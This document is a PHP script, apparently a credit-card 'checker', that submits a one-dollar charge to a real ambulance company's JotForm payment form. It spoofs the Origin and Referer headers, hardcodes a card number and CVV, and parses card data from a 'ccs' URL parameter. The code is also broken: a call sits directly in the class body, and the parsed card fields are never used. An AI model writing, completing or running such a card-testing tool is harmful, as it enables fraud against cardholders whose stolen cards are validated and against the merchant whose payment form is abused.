<?php
function value($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function multiexplode($delimiters,$string) {
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}

function getstr($string, $start, $end, $offset = 1) {
    $str = explode($start, $string);
    $str = explode($end, $str[$offset]);
     return $str[0];
}
class curl{
    sleep(1); //Tempo de resposta para cada request
    private $link;
    private $post;
    private $response;
    private $headers;
    public function setlink($link, $post, $array){
    $this->link = $link;
    $ch = curl_init($this->link);
    $this->post = $post;
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    $this->headers = $array;
    $arrayHeader = $array;
    curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);
    curl_setopt($ch, CURLOPT_URL, $this->link);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $this->post);
    //
    $response = curl_exec($ch);
    $this->response = $response;
    
    curl_close($ch);
    
    return $this->response;
    }

}

$instancia = new curl();
$arrayheader = array(
    'Host: pci.jotform.com',
    'Connection: keep-alive',
    'Origin: https://www.fallonambulance.com',
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Referer: https://www.fallonambulance.com/patient-resources/make-a-payment'
);
$valor = $instancia->setlink("https://pci.jotform.com/submit/71865971884172", "formID=71865971884172&q4_runNumber=434343&q5_phoneNumber%5Barea%5D=222&q5_phoneNumber%5Bphone%5D=2222222&q6_email=asdc4343%40dcjhbu.com&simple_fpc=3&payment_total_checksum=1&q3_myProducts%5Bprice%5D=1&q3_myProducts%5Bcc_firstName%5D=asc&q3_myProducts%5Bcc_lastName%5D=ascasdc&q3_myProducts%5Bcc_number%5D=5522894305414256&q3_myProducts%5Bcc_ccv%5D=333&q3_myProducts%5Bcc_exp_month%5D=March&q3_myProducts%5Bcc_exp_year%5D=2021&q3_myProducts%5Baddr_line1%5D=asdcasc4343&q3_myProducts%5Baddr_line2%5D=adcasd3443&q3_myProducts%5Bcity%5D=NewYork&q3_myProducts%5Bstate%5D=NY&q3_myProducts%5Bpostal%5D=10001&q3_myProducts%5Bcountry%5D=United+States&website=&simple_spc=71865971884172-71865971884172&embedUrl=&event_id=1555033390163_71865971884172_L4dY2D3", $arrayheader);



$ccs = $_GET['ccs'];
$separa = multiexplode(array(";",".","|",":"),$ccs);
$numero = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];





echo $valor;



	






?>